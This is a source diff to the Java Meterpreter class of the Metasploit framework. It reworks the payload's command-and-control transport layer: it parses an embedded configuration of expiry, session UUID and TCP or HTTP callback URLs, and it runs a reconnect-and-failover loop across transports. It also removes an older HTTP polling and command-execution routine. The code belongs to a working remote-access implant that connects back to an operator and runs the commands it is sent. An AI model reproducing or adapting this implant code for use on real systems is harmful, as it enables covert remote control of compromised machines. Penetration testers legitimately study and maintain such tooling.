@@ -8,9 +8,11 @@ import java.io.EOFException;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.PrintStream;
+
+import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLClassLoader;
-import java.net.URLConnection;
+
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
@@ -27,19 +29,103 @@ import com.metasploit.meterpreter.core.core_loadlib;
  */
 public class Meterpreter {
 
-    private static final int PACKET_TYPE_REQUEST = 0;
-    private static final int PACKET_TYPE_RESPONSE = 1;
+    public static final int UUID_LEN = 16;
+    public static final int URL_LEN = 512;
 
     private List/* <Channel> */channels = new ArrayList();
     private final CommandManager commandManager;
-    private final DataInputStream in;
-    private final DataOutputStream out;
     private final Random rnd = new Random();
     private final ByteArrayOutputStream errBuffer;
     private final PrintStream err;
     private final boolean loadExtensions;
     private List/* <byte[]> */tlvQueue = null;
 
+
+    private final TransportList transports = new TransportList();
+    private int ignoreBlocks = 0;
+    private byte[] uuid;
+    private long sessionExpiry;
+
+
+    private void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) throws MalformedURLException {
+        // socket handle is 4 bytes, followed by exit func, both of
+        // which we ignore.
+        int csr = 8;
+
+        // We start with the expiry, which is a 32 bit int
+        setExpiry(unpack32(configuration, csr));
+        csr += 4;
+
+        // this is followed with the UUID
+        this.uuid = readBytes(configuration, csr, UUID_LEN);
+        csr += UUID_LEN;
+
+        // here we need to loop through all the given transports, we know that we're
+        // going to get at least one.
+        while (configuration[csr] != '\0') {
+            // read the transport URL
+            String url = readString(configuration, csr, URL_LEN);
+            csr += URL_LEN;
+
+            Transport t = null;
+            if (url.startsWith("tcp")) {
+                t = new TcpTransport(url);
+            } else {
+                t = new HttpTransport(url);
+            }
+
+            csr = t.parseConfig(configuration, csr);
+            if (this.transports.isEmpty()) {
+                t.bind(in, rawOut);
+            }
+            this.transports.add(t);
+        }
+        
+        // we don't currently support extensions, so when we reach the end of the
+        // list of transports we just bomb out.
+    }
+
+    public byte[] getUUID() {
+        return this.uuid;
+    }
+
+    public long getExpiry() {
+        return (this.sessionExpiry - System.currentTimeMillis()) / Transport.MS;
+    }
+
+    public int getIgnoreBlocks() {
+        return this.ignoreBlocks;
+    }
+
+    public void setExpiry(long seconds) {
+        this.sessionExpiry = System.currentTimeMillis() + seconds * Transport.MS;
+    }
+
+    public void sleep(long milliseconds) {
+        try {
+            Thread.sleep(milliseconds);
+        } catch (InterruptedException ex) {
+            // ignore
+        }
+    }
+
+    public static String readString(byte[] bytes, int offset, int size) {
+        return new String(readBytes(bytes, offset, size)).trim();
+    }
+
+    public static byte[] readBytes(byte[] bytes, int offset, int size) {
+        byte[] buf = new byte[size];
+        System.arraycopy(bytes, offset, buf, 0, size);
+        return buf;
+    }
+
+    public static int unpack32(byte[] bytes, int offset) {
+        int res = 0;
+        for (int i = 0; i < 4; i++) {
+          res = res | (((int)bytes[i + offset]) & 0xFF) << (i * 8);
+        }
+        return res;
+    }
 
     /**
      * Initialize the meterpreter.
@@ -65,11 +151,23 @@ public class Meterpreter {
      * @throws Exception
      */
     public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors, boolean beginExecution) throws Exception {
+
+        int configLen = in.readInt();
+        byte[] configBytes = new byte[configLen];
+        in.readFully(configBytes);
+
+        loadConfiguration(in, rawOut, configBytes);
+
+        // after the configuration block is a 32 bit integer that tells us
+        // how many stages were wired into the payload. We need to stash this
+        // because in the case of TCP comms, we need to skip this number of
+        // blocks down the track when we reconnect. We have to store this in
+        // the meterpreter class instead of the TCP comms class though
+        this.ignoreBlocks = in.readInt();
+
         this.loadExtensions = loadExtensions;
-        this.in = in;
-        this.out = new DataOutputStream(rawOut);
-        commandManager = new CommandManager();
-        channels.add(null); // main communication channel?
+        this.commandManager = new CommandManager();
+        this.channels.add(null); // main communication channel?
         if (redirectErrors) {
             errBuffer = new ByteArrayOutputStream();
             err = new PrintStream(errBuffer);
@@ -82,21 +180,29 @@ public class Meterpreter {
         }
     }
 
+    public TransportList getTransports() {
+        return this.transports;
+    }
+
+    public boolean hasSessionExpired() {
+        return System.currentTimeMillis() > this.sessionExpiry;
+    }
+
     public void startExecuting() throws Exception {
-        try {
-            while (true) {
-                int len = in.readInt();
-                int ptype = in.readInt();
-                if (ptype != PACKET_TYPE_REQUEST)
-                    throw new IOException("Invalid packet type: " + ptype);
-                TLVPacket request = new TLVPacket(in, len - 8);
-                TLVPacket response = executeCommand(request);
-                if (response != null)
-                    writeTLV(PACKET_TYPE_RESPONSE, response);
+        while (!this.hasSessionExpired() && this.transports.current() != null) {
+            if (!this.transports.current().connect(this)) {
+                continue;
             }
-        } catch (EOFException ex) {
+
+            boolean cleanExit = this.transports.current().dispatch(this);
+            this.transports.current().disconnect();
+
+            if (cleanExit && !this.transports.changeRequested()) {
+                break;
+            }
+
+            this.transports.moveNext(this);
         }
-        out.close();
         synchronized (this) {
             for (Iterator it = channels.iterator(); it.hasNext(); ) {
                 Channel c = (Channel) it.next();
@@ -108,148 +214,6 @@ public class Meterpreter {
 
     protected String getPayloadTrustManager() {
         return "com.metasploit.meterpreter.PayloadTrustManager";
-    }
-
-    /**
-     * Write a TLV packet to this meterpreter's output stream.
-     *
-     * @param type   The type ({@link #PACKET_TYPE_REQUEST} or {@link #PACKET_TYPE_RESPONSE})
-     * @param packet The packet to send
-     */
-    private synchronized void writeTLV(int type, TLVPacket packet) throws IOException {
-        byte[] data = packet.toByteArray();
-        if (tlvQueue != null) {
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            DataOutputStream dos = new DataOutputStream(baos);
-            dos.writeInt(data.length + 8);
-            dos.writeInt(type);
-            dos.write(data);
-            tlvQueue.add(baos.toByteArray());
-            return;
-        }
-        synchronized (out) {
-            out.writeInt(data.length + 8);
-            out.writeInt(type);
-            out.write(data);
-            out.flush();
-        }
-    }
-
-    /**
-     * Execute a command request.
-     *
-     * @param request The request to execute
-     * @return The response packet to send back
-     */
-    private TLVPacket executeCommand(TLVPacket request) throws IOException {
-        TLVPacket response = new TLVPacket();
-        String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
-        if (method.equals("core_switch_url")) {
-            String url = request.getStringValue(TLVType.TLV_TYPE_STRING);
-            int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
-            int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
-            pollURL(new URL(url), sessionExpirationTimeout, sessionCommunicationTimeout);
-            return null;
-        } else if (method.equals("core_shutdown")) {
-            return null;
-        }
-        response.add(TLVType.TLV_TYPE_METHOD, method);
-        response.add(TLVType.TLV_TYPE_REQUEST_ID, request.getStringValue(TLVType.TLV_TYPE_REQUEST_ID));
-        Command cmd = commandManager.getCommand(method);
-        int result;
-        try {
-            result = cmd.execute(this, request, response);
-        } catch (Throwable t) {
-            t.printStackTrace(getErrorStream());
-            result = Command.ERROR_FAILURE;
-        }
-        response.add(TLVType.TLV_TYPE_RESULT, result);
-        return response;
-    }
-
-    /**
-     * Poll from a given URL until a shutdown request is received.
-     *
-     * @param url
-     */
-    private void pollURL(URL url, int sessionExpirationTimeout, int sessionCommunicationTimeout) throws IOException {
-        synchronized (this) {
-            tlvQueue = new ArrayList();
-        }
-        int ecount = 0;
-        long deadline = System.currentTimeMillis() + sessionExpirationTimeout * 1000L;
-        long commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
-        final byte[] RECV = "RECV".getBytes("ISO-8859-1");
-        while (System.currentTimeMillis() < Math.min(commDeadline, deadline)) {
-            byte[] outPacket = null;
-            synchronized (this) {
-                if (tlvQueue.size() > 0)
-                    outPacket = (byte[]) tlvQueue.remove(0);
-            }
-            TLVPacket request = null;
-            try {
-                URLConnection uc = url.openConnection();
-                if (url.getProtocol().equals("https")) {
-                    // load the trust manager via reflection, to avoid loading
-                    // it when it is not needed (it requires Sun Java 1.4+)
-                    try {
-                        Class.forName(getPayloadTrustManager()).getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
-                    } catch (Exception ex) {
-                        ex.printStackTrace(getErrorStream());
-                    }
-                }
-                uc.setDoOutput(true);
-                OutputStream out = uc.getOutputStream();
-                out.write(outPacket == null ? RECV : outPacket);
-                out.close();
-                DataInputStream in = new DataInputStream(uc.getInputStream());
-                int len;
-                try {
-                    len = in.readInt();
-                } catch (EOFException ex) {
-                    len = -1;
-                }
-                if (len != -1) {
-                    int ptype = in.readInt();
-                    if (ptype != PACKET_TYPE_REQUEST)
-                        throw new RuntimeException("Invalid packet type: " + ptype);
-                    request = new TLVPacket(in, len - 8);
-                }
-                in.close();
-                commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
-            } catch (IOException ex) {
-                ex.printStackTrace(getErrorStream());
-                // URL not reachable
-                if (outPacket != null) {
-                    synchronized (this) {
-                        tlvQueue.add(0, outPacket);
-                    }
-                }
-            }
-            if (request != null) {
-                ecount = 0;
-                TLVPacket response = executeCommand(request);
-                if (response == null)
-                    break;
-                writeTLV(PACKET_TYPE_RESPONSE, response);
-            } else if (outPacket == null) {
-                int delay;
-                if (ecount < 10) {
-                    delay = 10 * ecount;
-                } else {
-                    delay = 100 * ecount;
-                }
-                ecount++;
-                try {
-                    Thread.sleep(Math.min(10000, delay));
-                } catch (InterruptedException ex) {
-                    // ignore
-                }
-            }
-        }
-        synchronized (this) {
-            tlvQueue = new ArrayList();
-        }
     }
 
     /**
@@ -288,10 +252,12 @@ public class Meterpreter {
      */
     public Channel getChannel(int id, boolean throwIfNonexisting) {
         Channel result = null;
-        if (id < channels.size())
+        if (id < channels.size()) {
             result = (Channel) channels.get(id);
-        if (result == null && throwIfNonexisting)
+        }
+        if (result == null && throwIfNonexisting) {
             throw new IllegalArgumentException("Channel " + id + " does not exist.");
+        }
         return result;
     }
 
@@ -306,8 +272,9 @@ public class Meterpreter {
      * Return the length of the currently buffered error stream content, or <code>-1</code> if no buffering is active.
      */
     public int getErrorBufferLength() {
-        if (errBuffer == null)
+        if (errBuffer == null) {
             return -1;
+        }
         return errBuffer.size();
     }
 
@@ -315,8 +282,9 @@ public class Meterpreter {
      * Return the currently buffered error stream content, or <code>null</code> if no buffering is active.
      */
     public byte[] getErrorBuffer() {
-        if (errBuffer == null)
+        if (errBuffer == null) {
             return null;
+        }
         synchronized (errBuffer) {
             byte[] result = errBuffer.toByteArray();
             errBuffer.reset();
@@ -337,7 +305,7 @@ public class Meterpreter {
             requestID[i] = (char) ('A' + rnd.nextInt(26));
         }
         tlv.add(TLVType.TLV_TYPE_REQUEST_ID, new String(requestID));
-        writeTLV(PACKET_TYPE_REQUEST, tlv);
+        this.transports.current().writePacket(tlv, TLVPacket.PACKET_TYPE_REQUEST);
     }
 
     /**
